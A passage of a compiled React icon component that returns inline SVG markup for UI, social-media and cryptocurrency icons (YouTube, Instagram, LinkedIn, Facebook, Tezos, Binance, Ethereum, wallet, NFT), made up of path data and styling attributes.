        d: "M28.2137 2.76439H26.5378V1.50324C26.5378 1.26821 26.3975 1.05588 26.1813 0.96357C22.6418 -0.547395 18.287 0.092985 14.7183 2.62411C11.1498 0.092985 6.7948 -0.547216 3.25537 0.96357C3.03917 1.05588 2.89895 1.26821 2.89895 1.50324V2.76439H1.22298C0.898973 2.76439 0.63623 3.02707 0.63623 3.35114V19.5693C0.63623 19.8933 0.898973 20.156 1.22298 20.156H14.7184H28.2137C28.5378 20.156 28.8005 19.8933 28.8005 19.5693V3.3512C28.8005 3.02713 28.5378 2.76439 28.2137 2.76439ZM1.80972 18.9825V3.93794H2.89895V17.7214C2.89895 17.9185 2.99794 18.1023 3.16235 18.211C3.32683 18.3195 3.53474 18.3383 3.71602 18.261C6.46442 17.0877 9.78348 17.3811 12.7294 18.9825H1.80972ZM14.1316 18.4474C11.9901 17.0827 9.60792 16.3742 7.30843 16.3742C6.19828 16.3742 5.10756 16.5393 4.07251 16.8755V3.35799C4.07251 3.35567 4.07286 3.35346 4.07286 3.3512C4.07286 3.34893 4.07256 3.34667 4.07251 3.3444V1.90012C7.20212 0.727107 10.997 1.3831 14.1316 3.64707V18.4474ZM15.3051 3.64707C18.4397 1.38304 22.2348 0.727107 25.3643 1.90012V3.34434C25.3643 3.34661 25.3639 3.34887 25.3639 3.35114C25.3639 3.3534 25.3642 3.35567 25.3643 3.35793V16.8754C22.1851 15.8427 18.4805 16.4239 15.3051 18.4473V3.64707ZM27.627 18.9825H16.7073C19.6532 17.3811 22.9722 17.0878 25.7207 18.261C25.902 18.3384 26.1101 18.3196 26.2744 18.211C26.4388 18.1023 26.5378 17.9184 26.5378 17.7214V3.93794H27.627V18.9825Z"
      }));
    case "eye-view-all":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "25",
        height: "20",
        viewBox: "0 0 25 20",
        fill: "#F64900",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "eye-view-all"), /*#__PURE__*/React__default.createElement("path", {
        d: "M23.6757 16.2944C23.2254 16.5249 22.6713 16.3487 22.4389 15.8961H22.4388C21.0289 13.1485 17.2854 9.20938 12.4063 9.20938C8.03058 9.20938 4.14198 12.4504 2.3738 15.8961C2.1412 16.347 1.58727 16.525 1.136 16.2932C0.684785 16.0614 0.50621 15.5086 0.737337 15.057C2.76888 11.09 7.23642 7.3703 12.4063 7.3703C18.3024 7.3703 22.5252 12.0302 24.0753 15.057C24.3067 15.509 24.1278 16.0631 23.6757 16.2944ZM0.993521 6.41857L3.04152 8.26611C3.42083 8.60832 4.00207 8.57407 4.34023 8.19926C4.68037 7.82216 4.65049 7.24074 4.27338 6.90055L2.22538 5.05301C1.84842 4.71292 1.26699 4.74271 0.92667 5.11986C0.586532 5.49697 0.616417 6.07839 0.993521 6.41857ZM21.771 8.26611L23.819 6.41857C24.1961 6.07839 24.226 5.49697 23.8858 5.11986C23.5457 4.7428 22.9642 4.71283 22.5871 5.05301L20.5392 6.90055C20.1621 7.24069 20.1322 7.82216 20.4723 8.19926C20.8109 8.57448 21.3922 8.60791 21.771 8.26611ZM12.4063 4.60018C12.9141 4.60018 13.3258 4.18846 13.3258 3.68064V0.91954C13.3258 0.411724 12.9141 0 12.4063 0C11.8984 0 11.4867 0.411724 11.4867 0.91954V3.68064C11.4868 4.18851 11.8984 4.60018 12.4063 4.60018ZM16.9235 15.4759C16.9235 17.9705 14.8971 20 12.4063 20C9.91554 20 7.88911 17.9705 7.88911 15.4759C7.88911 12.9813 9.91554 10.9518 12.4063 10.9518C14.8971 10.9518 16.9235 12.9813 16.9235 15.4759ZM15.0845 15.4759C15.0845 13.9954 13.8831 12.7909 12.4063 12.7909C10.9296 12.7909 9.72819 13.9954 9.72819 15.4759C9.72819 16.9564 10.9296 18.1609 12.4063 18.1609C13.883 18.1609 15.0845 16.9564 15.0845 15.4759Z"
      }));
    case "bold-arrow-top":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "19",
        height: "16",
        viewBox: "0 0 19 16",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "bold-arrow-top"), /*#__PURE__*/React__default.createElement("path", {
        d: "M9.66729 0.111529C9.51855 -0.0371763 9.27742 -0.0371763 9.12865 0.111529L0.748224 8.49195C0.67655 8.56341 0.636267 8.66044 0.636231 8.76165V15.6184C0.635838 15.8288 0.806114 15.9996 1.01649 16C1.11792 16.0002 1.21523 15.9599 1.28687 15.8881L9.39763 7.77657L17.5084 15.8881C17.657 16.037 17.8982 16.0373 18.0471 15.8888C18.1189 15.8171 18.1592 15.7198 18.159 15.6184V8.76165C18.1592 8.66055 18.1192 8.56352 18.0478 8.49195L9.66729 0.111529Z",
        fill: "#F64900"
      }));
    case "bold-arrow-down":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "19",
        height: "16",
        viewBox: "0 0 19 16",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "bold-arrow-down"), /*#__PURE__*/React__default.createElement("path", {
        d: "M9.66729 15.8885C9.51855 16.0372 9.27742 16.0372 9.12865 15.8885L0.748224 7.50805C0.67655 7.43659 0.636267 7.33956 0.636231 7.23835V0.381619C0.635838 0.171239 0.806114 0.000392914 1.01649 9.53674e-07C1.11792 -0.000177383 1.21523 0.0401039 1.28687 0.111921L9.39763 8.22343L17.5084 0.111921C17.657 -0.0370331 17.8982 -0.0373192 18.0471 0.111243C18.1189 0.182882 18.1592 0.280197 18.159 0.381619V7.23835C18.1592 7.33945 18.1192 7.43648 18.0478 7.50805L9.66729 15.8885Z",
        fill: "#F64900"
      }));
    case "copyright":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "21",
        height: "16",
        viewBox: "0 0 17 16",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "copyright"), /*#__PURE__*/React__default.createElement("path", {
        d: "M8.63623 16C4.22511 16 0.63623 12.4111 0.63623 8C0.63623 3.58888 4.22511 0 8.63623 0C13.0474 0 16.6362 3.58888 16.6362 8C16.6362 12.4111 13.0474 16 8.63623 16ZM8.63623 1C4.77636 1 1.63623 4.14013 1.63623 8C1.63623 11.8599 4.77636 15 8.63623 15C12.4961 15 15.6362 11.8599 15.6362 8C15.6362 4.14013 12.4961 1 8.63623 1Z",
        fill: "white",
        fillOpacity: "0.5"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M8.63625 12C6.43069 12 4.63623 10.2056 4.63623 8.00002C4.63623 5.79442 6.43065 4 8.63625 4C9.72071 4 10.7354 4.42677 11.4942 5.20166L10.7793 5.90086C10.2105 5.31979 9.44976 4.99997 8.63625 4.99997C6.98194 4.99997 5.63624 6.34568 5.63624 7.99998C5.63624 9.65429 6.98194 11 8.63625 11C9.44925 11 10.21 10.6802 10.7793 10.0991L11.4932 10.7993C10.7349 11.5737 9.72024 12 8.63625 12Z",
        fill: "white",
        fillOpacity: "0.5"
      }));
    case "youtube":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "46",
        height: "32",
        viewBox: "0 0 46 32",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "youtube"), /*#__PURE__*/React__default.createElement("path", {
        d: "M1.64833 27.0629C2.57107 30.3358 5.39389 30.9346 5.58221 31.0495C10.2279 32.315 36.2679 32.3187 40.9833 31.0495C44.2129 30.1155 44.8061 27.2512 44.9172 27.0629C46.1469 20.5209 46.2278 11.9921 44.8607 4.56881L44.9172 4.9379C43.9944 1.66501 41.1716 1.06617 40.9833 0.951302C36.3997 -0.293452 10.2919 -0.340531 5.58221 0.951302C2.35263 1.88722 1.75944 4.74959 1.64833 4.9379C0.332019 11.8132 0.266109 19.7017 1.64833 27.0629ZM18.7585 22.8767V9.14295L30.5583 16.0202L18.7585 22.8767Z",
        fill: "#797C80"
      }));
    case "instagram":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "33",
        height: "32",
        viewBox: "0 0 33 32",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "instagram"), /*#__PURE__*/React__default.createElement("path", {
        d: "M20.9027 8.01254H12.8202C12.3023 8.01231 11.7893 8.11412 11.3107 8.31217C10.8321 8.51022 10.3972 8.80063 10.0309 9.1668C9.66454 9.53297 9.37393 9.96773 9.17566 10.4462C8.97739 10.9248 8.87534 11.4376 8.87534 11.9556V20.0381C8.8751 20.5562 8.97697 21.0693 9.17514 21.548C9.3733 22.0267 9.66387 22.4617 10.0302 22.8281C10.3966 23.1944 10.8316 23.485 11.3103 23.6832C11.789 23.8813 12.3021 23.9832 12.8202 23.983H20.9027C21.4208 23.9832 21.9339 23.8813 22.4126 23.6832C22.8913 23.485 23.3263 23.1944 23.6927 22.8281C24.059 22.4617 24.3496 22.0267 24.5478 21.548C24.7459 21.0693 24.8478 20.5562 24.8476 20.0381V11.9556C24.8476 11.4376 24.7455 10.9248 24.5472 10.4462C24.349 9.96773 24.0584 9.53297 23.692 9.1668C23.3257 8.80063 22.8908 8.51022 22.4122 8.31217C21.9336 8.11412 21.4206 8.01231 20.9027 8.01254ZM16.8615 21.1706C15.8385 21.1706 14.8386 20.8673 13.9881 20.299C13.1375 19.7307 12.4746 18.9229 12.0832 17.9779C11.6917 17.0328 11.5893 15.9929 11.7889 14.9897C11.9884 13.9864 12.481 13.0648 13.2043 12.3415C13.9276 11.6182 14.8492 11.1256 15.8524 10.9261C16.8557 10.7265 17.8956 10.8289 18.8407 11.2204C19.7857 11.6118 20.5935 12.2747 21.1618 13.1253C21.7301 13.9758 22.0334 14.9757 22.0334 15.9987C22.0315 17.3698 21.486 18.6842 20.5165 19.6537C19.5469 20.6232 18.2326 21.1687 16.8615 21.1706ZM22.0625 12.1029C21.8108 12.1029 21.5648 12.0282 21.3555 11.8884C21.1463 11.7486 20.9832 11.5498 20.8868 11.3173C20.7905 11.0848 20.7653 10.8289 20.8144 10.5821C20.8635 10.3352 20.9847 10.1085 21.1627 9.93049C21.3407 9.75252 21.5674 9.63133 21.8143 9.58222C22.0611 9.53312 22.317 9.55832 22.5495 9.65464C22.782 9.75096 22.9808 9.91406 23.1206 10.1233C23.2604 10.3326 23.3351 10.5786 23.3351 10.8303C23.3351 11.1678 23.201 11.4915 22.9623 11.7301C22.7237 11.9688 22.4 12.1029 22.0625 12.1029ZM16.8615 12.8373C16.2362 12.8373 15.625 13.0227 15.1051 13.3701C14.5852 13.7175 14.18 14.2112 13.9407 14.7889C13.7015 15.3665 13.6389 16.0022 13.7608 16.6154C13.8828 17.2287 14.1839 17.792 14.626 18.2341C15.0682 18.6762 15.6315 18.9773 16.2447 19.0993C16.8579 19.2213 17.4936 19.1586 18.0713 18.9194C18.6489 18.6801 19.1427 18.2749 19.49 17.755C19.8374 17.2351 20.0228 16.6239 20.0228 15.9987C20.0228 15.1602 19.6897 14.3561 19.0969 13.7632C18.504 13.1704 17.6999 12.8373 16.8615 12.8373ZM20.9027 8.01254H12.8202C12.3023 8.01231 11.7893 8.11412 11.3107 8.31217C10.8321 8.51022 10.3972 8.80063 10.0309 9.1668C9.66454 9.53297 9.37393 9.96773 9.17566 10.4462C8.97739 10.9248 8.87534 11.4376 8.87534 11.9556V20.0381C8.8751 20.5562 8.97697 21.0693 9.17514 21.548C9.3733 22.0267 9.66387 22.4617 10.0302 22.8281C10.3966 23.1944 10.8316 23.485 11.3103 23.6832C11.789 23.8813 12.3021 23.9832 12.8202 23.983H20.9027C21.4208 23.9832 21.9339 23.8813 22.4126 23.6832C22.8913 23.485 23.3263 23.1944 23.6927 22.8281C24.059 22.4617 24.3496 22.0267 24.5478 21.548C24.7459 21.0693 24.8478 20.5562 24.8476 20.0381V11.9556C24.8476 11.4376 24.7455 10.9248 24.5472 10.4462C24.349 9.96773 24.0584 9.53297 23.692 9.1668C23.3257 8.80063 22.8908 8.51022 22.4122 8.31217C21.9336 8.11412 21.4206 8.01231 20.9027 8.01254ZM16.8615 21.1706C15.8385 21.1706 14.8386 20.8673 13.9881 20.299C13.1375 19.7307 12.4746 18.9229 12.0832 17.9779C11.6917 17.0328 11.5893 15.9929 11.7889 14.9897C11.9884 13.9864 12.481 13.0648 13.2043 12.3415C13.9276 11.6182 14.8492 11.1256 15.8524 10.9261C16.8557 10.7265 17.8956 10.8289 18.8407 11.2204C19.7857 11.6118 20.5935 12.2747 21.1618 13.1253C21.7301 13.9758 22.0334 14.9757 22.0334 15.9987C22.0315 17.3698 21.486 18.6842 20.5165 19.6537C19.5469 20.6232 18.2326 21.1687 16.8615 21.1706ZM22.0625 12.1029C21.8108 12.1029 21.5648 12.0282 21.3555 11.8884C21.1463 11.7486 20.9832 11.5498 20.8868 11.3173C20.7905 11.0848 20.7653 10.8289 20.8144 10.5821C20.8635 10.3352 20.9847 10.1085 21.1627 9.93049C21.3407 9.75252 21.5674 9.63133 21.8143 9.58222C22.0611 9.53312 22.317 9.55832 22.5495 9.65464C22.782 9.75096 22.9808 9.91406 23.1206 10.1233C23.2604 10.3326 23.3351 10.5786 23.3351 10.8303C23.3351 11.1678 23.201 11.4915 22.9623 11.7301C22.7237 11.9688 22.4 12.1029 22.0625 12.1029ZM16.8615 12.8373C16.2362 12.8373 15.625 13.0227 15.1051 13.3701C14.5852 13.7175 14.18 14.2112 13.9407 14.7889C13.7015 15.3665 13.6389 16.0022 13.7608 16.6154C13.8828 17.2287 14.1839 17.792 14.626 18.2341C15.0682 18.6762 15.6315 18.9773 16.2447 19.0993C16.8579 19.2213 17.4936 19.1586 18.0713 18.9194C18.6489 18.6801 19.1427 18.2749 19.49 17.755C19.8374 17.2351 20.0228 16.6239 20.0228 15.9987C20.0228 15.1602 19.6897 14.3561 19.0969 13.7632C18.504 13.1704 17.6999 12.8373 16.8615 12.8373ZM32.3138 5.72197C32.1721 4.39752 31.5811 3.16155 30.639 2.21985C29.697 1.27815 28.4608 0.687541 27.1363 0.546355C20.3082 -0.182118 13.422 -0.182118 6.59385 0.546355C5.26805 0.685979 4.03018 1.2759 3.08669 2.21774C2.14319 3.15958 1.5511 4.39641 1.40915 5.72197C0.680674 12.5501 0.680674 19.4363 1.40915 26.2644C1.54846 27.5908 2.13847 28.8293 3.08071 29.7732C4.02295 30.7171 5.26042 31.3093 6.58658 31.451C13.4145 32.183 20.3011 32.183 27.1291 31.451C28.4554 31.3112 29.6937 30.7207 30.6373 29.7782C31.5808 28.8356 32.1726 27.5979 32.3138 26.2717C33.0427 19.4412 33.0427 12.5525 32.3138 5.72197ZM26.86 20.0381C26.859 21.6179 26.2311 23.1328 25.1142 24.2501C23.9972 25.3674 22.4825 25.9958 20.9027 25.9972H12.8202C11.2405 25.9953 9.72609 25.3668 8.60924 24.2496C7.49239 23.1324 6.86435 21.6178 6.8629 20.0381V11.9556C6.86483 10.3764 7.49315 8.86243 8.61 7.74592C9.72684 6.62941 11.241 6.00155 12.8202 6.00011H20.9027C22.4819 6.00155 23.9961 6.62941 25.1129 7.74592C26.2298 8.86243 26.8581 10.3764 26.86 11.9556V20.0381ZM20.9027 8.01254H12.8202C12.3023 8.01231 11.7893 8.11412 11.3107 8.31217C10.8321 8.51022 10.3972 8.80063 10.0309 9.1668C9.66454 9.53297 9.37393 9.96773 9.17566 10.4462C8.97739 10.9248 8.87534 11.4376 8.87534 11.9556V20.0381C8.8751 20.5562 8.97697 21.0693 9.17514 21.548C9.3733 22.0267 9.66387 22.4617 10.0302 22.8281C10.3966 23.1944 10.8316 23.485 11.3103 23.6832C11.789 23.8813 12.3021 23.9832 12.8202 23.983H20.9027C21.4208 23.9832 21.9339 23.8813 22.4126 23.6832C22.8913 23.485 23.3263 23.1944 23.6927 22.8281C24.059 22.4617 24.3496 22.0267 24.5478 21.548C24.7459 21.0693 24.8478 20.5562 24.8476 20.0381V11.9556C24.8476 11.4376 24.7455 10.9248 24.5472 10.4462C24.349 9.96773 24.0584 9.53297 23.692 9.1668C23.3257 8.80063 22.8908 8.51022 22.4122 8.31217C21.9336 8.11412 21.4206 8.01231 20.9027 8.01254ZM16.8615 21.1706C15.8385 21.1706 14.8386 20.8673 13.9881 20.299C13.1375 19.7307 12.4746 18.9229 12.0832 17.9779C11.6917 17.0328 11.5893 15.9929 11.7889 14.9897C11.9884 13.9864 12.481 13.0648 13.2043 12.3415C13.9276 11.6182 14.8492 11.1256 15.8524 10.9261C16.8557 10.7265 17.8956 10.8289 18.8407 11.2204C19.7857 11.6118 20.5935 12.2747 21.1618 13.1253C21.7301 13.9758 22.0334 14.9757 22.0334 15.9987C22.0315 17.3698 21.486 18.6842 20.5165 19.6537C19.5469 20.6232 18.2326 21.1687 16.8615 21.1706ZM22.0625 12.1029C21.8108 12.1029 21.5648 12.0282 21.3555 11.8884C21.1463 11.7486 20.9832 11.5498 20.8868 11.3173C20.7905 11.0848 20.7653 10.8289 20.8144 10.5821C20.8635 10.3352 20.9847 10.1085 21.1627 9.93049C21.3407 9.75252 21.5674 9.63133 21.8143 9.58222C22.0611 9.53312 22.317 9.55832 22.5495 9.65464C22.782 9.75096 22.9808 9.91406 23.1206 10.1233C23.2604 10.3326 23.3351 10.5786 23.3351 10.8303C23.3351 11.1678 23.201 11.4915 22.9623 11.7301C22.7237 11.9688 22.4 12.1029 22.0625 12.1029ZM16.8615 12.8373C16.2362 12.8373 15.625 13.0227 15.1051 13.3701C14.5852 13.7175 14.18 14.2112 13.9407 14.7889C13.7015 15.3665 13.6389 16.0022 13.7608 16.6154C13.8828 17.2287 14.1839 17.792 14.626 18.2341C15.0682 18.6762 15.6315 18.9773 16.2447 19.0993C16.8579 19.2213 17.4936 19.1586 18.0713 18.9194C18.6489 18.6801 19.1427 18.2749 19.49 17.755C19.8374 17.2351 20.0228 16.6239 20.0228 15.9987C20.0228 15.1602 19.6897 14.3561 19.0969 13.7632C18.504 13.1704 17.6999 12.8373 16.8615 12.8373Z",
        fill: "#797C80"
      }));
    case "linkedin":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "33",
        height: "32",
        viewBox: "0 0 33 32",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "linkedin"), /*#__PURE__*/React__default.createElement("path", {
        d: "M29.9657 0H3.75501C2.15635 0 0.860352 1.296 0.860352 2.89466V29.1053C0.860352 30.704 2.15635 32 3.75501 32H29.9656C31.5644 32 32.8603 30.704 32.8603 29.1053V2.89466C32.8603 1.296 31.5644 0 29.9657 0ZM10.7625 27.6309C10.7625 28.0962 10.3854 28.4733 9.92012 28.4733H6.33428C5.86902 28.4733 5.49189 28.0962 5.49189 27.6309V12.5992C5.49189 12.1339 5.86902 11.7568 6.33428 11.7568H9.92012C10.3854 11.7568 10.7625 12.1339 10.7625 12.5992V27.6309ZM8.1272 10.3399C6.24582 10.3399 4.72062 8.81466 4.72062 6.93328C4.72062 5.0519 6.24582 3.5267 8.1272 3.5267C10.0086 3.5267 11.5338 5.0519 11.5338 6.93328C11.5338 8.81466 10.0087 10.3399 8.1272 10.3399ZM29.502 27.6988C29.502 28.1265 29.1552 28.4733 28.7275 28.4733H24.8796C24.4519 28.4733 24.1051 28.1265 24.1051 27.6988V20.648C24.1051 19.5962 24.4136 16.039 21.3564 16.039C18.9849 16.039 18.5039 18.4738 18.4073 19.5665V27.6988C18.4073 28.1265 18.0606 28.4733 17.6328 28.4733H13.9112C13.4835 28.4733 13.1367 28.1265 13.1367 27.6988V12.5314C13.1367 12.1036 13.4835 11.7568 13.9112 11.7568H17.6328C18.0605 11.7568 18.4073 12.1036 18.4073 12.5314V13.8428C19.2867 12.5231 20.5935 11.5046 23.3759 11.5046C29.5373 11.5046 29.502 17.2609 29.502 20.4237V27.6988Z",
        fill: "#797C80"
      }));
    case "facebook":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "33",
        height: "32",
        viewBox: "0 0 33 32",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "facebook"), /*#__PURE__*/React__default.createElement("path", {
        fillRule: "evenodd",
        clipRule: "evenodd",
        d: "M4.86035 0H28.8604C31.0664 0 32.8604 1.794 32.8604 4V28C32.8604 30.206 31.0664 32 28.8604 32H22.8604V21H25.8604L27.8604 16H22.8604V12C22.8604 10.9852 23.6174 10.9911 24.5971 10.9987C24.6833 10.9993 24.7711 11 24.8604 11H26.8604V6H22.8604C19.5464 6 16.8604 8.686 16.8604 12V16H12.8604V21H16.8604V32H4.86035C2.65435 32 0.860352 30.206 0.860352 28V4C0.860352 1.794 2.65435 0 4.86035 0Z",
        fill: "#797C80"
      }));
    case "share":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "33",
        height: "32",
        viewBox: "0 0 33 32",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "share"), /*#__PURE__*/React__default.createElement("path", {
        d: "M14.4 0H6.4C2.8656 0 0 2.8656 0 6.4V25.6C0 29.1344 2.8656 32 6.4 32H25.6C29.1344 32 32 29.1344 32 25.6C32 21.9664 32 17.6 32 17.6C32 16.7168 31.2832 16 30.4 16C29.5168 16 28.8 16.7168 28.8 17.6V25.6C28.8 27.3664 27.3664 28.8 25.6 28.8C20.272 28.8 11.7264 28.8 6.4 28.8C4.632 28.8 3.2 27.3664 3.2 25.6C3.2 20.272 3.2 11.7264 3.2 6.4C3.2 4.632 4.632 3.2 6.4 3.2H14.4C15.2832 3.2 16 2.4832 16 1.6C16 0.7168 15.2832 0 14.4 0ZM26.5376 3.2H20.8C19.9168 3.2 19.2 2.4832 19.2 1.6C19.2 0.7168 19.9168 0 20.8 0H30.4C31.2832 0 32 0.7168 32 1.6V11.2C32 12.0832 31.2832 12.8 30.4 12.8C29.5168 12.8 28.8 12.0832 28.8 11.2V5.4624L17.1312 17.1312C16.5072 17.7552 15.4928 17.7552 14.8688 17.1312C14.2432 16.5072 14.2432 15.4928 14.8688 14.8688L26.5376 3.2Z",
        fill: "#C4C4C4"
      }));
    case "tezos":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "29",
        height: "41",
        viewBox: "0 0 29 41",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "tezos"), /*#__PURE__*/React__default.createElement("path", {
        d: "M28.8325 29.64C28.4174 22.2941 19.1764 18.9551 18.292 18.6122C18.2559 18.5941 18.2559 18.558 18.2739 18.5219L27.8037 8.95602V7.92723C27.7983 7.75938 27.6648 7.62582 27.4969 7.6204H9.93536V1.86282V0.130127L3.45583 1.48379V2.45843H3.8168C3.8168 2.45843 5.4051 2.45843 5.4051 4.04673V7.60235H0.38752C0.290056 7.60957 0.214251 7.68538 0.207031 7.78284V10.0389H5.42315V22.2941C5.42315 26.1385 7.89584 28.8098 12.2276 28.4488C13.1192 28.3603 13.9765 28.0499 14.7183 27.5463C15.045 27.337 15.2417 26.9778 15.2417 26.5898V25.3805C13.8339 26.319 12.6427 26.2649 12.6427 26.2649C9.89927 26.2649 9.95341 22.7814 9.95341 22.7814V10.0389H22.5876L13.491 19.2078C13.4729 20.417 13.4549 21.3556 13.4549 21.3736C13.4513 21.4007 13.4711 21.4242 13.4982 21.4278C13.5018 21.4278 13.5054 21.4278 13.509 21.4278C21.8476 22.8356 24.1037 28.2322 24.1037 29.8024C24.1037 29.8024 25.0062 37.4371 17.3715 37.9605C17.3715 37.9605 12.372 38.1771 11.4876 36.1737C11.4551 36.1087 11.484 36.0293 11.5489 35.9986C11.5525 35.9968 11.5562 35.995 11.5598 35.9932C12.4099 35.6376 12.9604 34.8038 12.9495 33.8815C12.9495 32.4015 12.0471 31.1922 10.152 31.1922C8.6178 31.1922 7.35438 32.4015 7.35438 33.8815C7.35438 33.8815 6.63242 40.3069 17.3534 40.1264C29.5906 39.9098 28.8325 29.64 28.8325 29.64Z",
        fill: "#14266C"
      }));
    case "binance":
      return /*#__PURE__*/React__default.createElement("svg", {
        width: "42",
        height: "41",
        viewBox: "0 0 42 41",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "binance"), /*#__PURE__*/React__default.createElement("path", {
        d: "M4.84278 15.579L0.0273438 20.1763L4.84278 24.7904L9.675 20.1805L4.84278 15.579ZM20.9544 30.9649L12.9258 23.2971L8.0349 27.7979L20.9544 40.1301L33.8738 27.7979L28.9703 23.2971L20.9544 30.9649ZM20.9544 9.2954L28.9703 16.9632L33.857 12.4623L20.9376 0.130127L8.01812 12.4623L12.9091 16.9632L20.9544 9.2954ZM37.1582 15.6209L32.326 20.214L37.1414 24.8281L41.9737 20.2182L37.1582 15.6209ZM21.0676 24.7442L25.8831 20.1301L21.0676 15.516L16.2522 20.1301L21.0676 24.7442Z",
        fill: "#F5DF11"
      }));
    case "ethereum":
      return /*#__PURE__*/React__default.createElement("svg", {
        width: "26",
        height: "40",
        viewBox: "0 0 26 40",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "ethereum"), /*#__PURE__*/React__default.createElement("path", {
        d: "M12.9913 27.6042L0.8125 20.1374L12.9913 0.0859375L25.1701 20.1374L12.9913 27.6042Z",
        fill: "#C2C3C7"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M12.9913 30.1908L0.951764 22.8081L0.8125 22.9337L12.9913 39.7414L25.1701 22.724L12.9913 30.1908Z",
        fill: "#C2C3C7"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M12.9922 27.6042V0.0859375L25.171 20.1374L12.9922 27.6042Z",
        fill: "#DBDCDF"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M12.9922 30.1908V39.7414L25.171 22.724L12.9922 30.1908Z",
        fill: "#DBDCDF"
      }));
    case "wallet":
      return /*#__PURE__*/React__default.createElement("svg", {
        width: "32",
        height: "40",
        xmlns: "http://www.w3.org/2000/svg",
        x: "0px",
        y: "0px",
        viewBox: "0 0 223 223",
        xmlSpace: "preserve"
      }, alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "ethereum"), /*#__PURE__*/React__default.createElement("g", null, /*#__PURE__*/React__default.createElement("path", {
        d: "M223,94.5c0-6.075-4.925-11-11-11h-63c-6.075,0-11,4.925-11,11v33c0,6.075,4.925,11,11,11h63c6.075,0,11-4.925,11-11V94.5z\r M169.515,123.967c-7.082,0-12.823-5.741-12.823-12.823c0-7.082,5.741-12.823,12.823-12.823c7.082,0,12.823,5.741,12.823,12.823\r C182.338,118.225,176.597,123.967,169.515,123.967z",
        fill: "#F64900"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M123.509,68.5H205v-33c0-8.271-6.395-15-14.667-15h-175C7.062,20.5,0,27.229,0,35.5v152c0,8.271,7.062,15,15.333,15h175\r c8.271,0,14.667-6.729,14.667-15v-34h-81.342L123.509,68.5z",
        fill: "#F64900"
      })), /*#__PURE__*/React__default.createElement("g", null), /*#__PURE__*/React__default.createElement("g", null), /*#__PURE__*/React__default.createElement("g", null), /*#__PURE__*/React__default.createElement("g", null), /*#__PURE__*/React__default.createElement("g", null), /*#__PURE__*/React__default.createElement("g", null), /*#__PURE__*/React__default.createElement("g", null), /*#__PURE__*/React__default.createElement("g", null), /*#__PURE__*/React__default.createElement("g", null), /*#__PURE__*/React__default.createElement("g", null), /*#__PURE__*/React__default.createElement("g", null), /*#__PURE__*/React__default.createElement("g", null), /*#__PURE__*/React__default.createElement("g", null), /*#__PURE__*/React__default.createElement("g", null), /*#__PURE__*/React__default.createElement("g", null));
    case "nft":
      return /*#__PURE__*/React__default.createElement("svg", {
        width: "32",
        height: "40",
        xmlns: "http://www.w3.org/2000/svg",
        x: "0px",
        y: "0px",
        viewBox: "0 0 121.86 122.88",
        xmlSpace: "preserve"
      }, /*#__PURE__*/React__default.createElement("g", null, /*#__PURE__*/React__default.createElement("path", {
        fill: "#F64900",
        className: "st0",
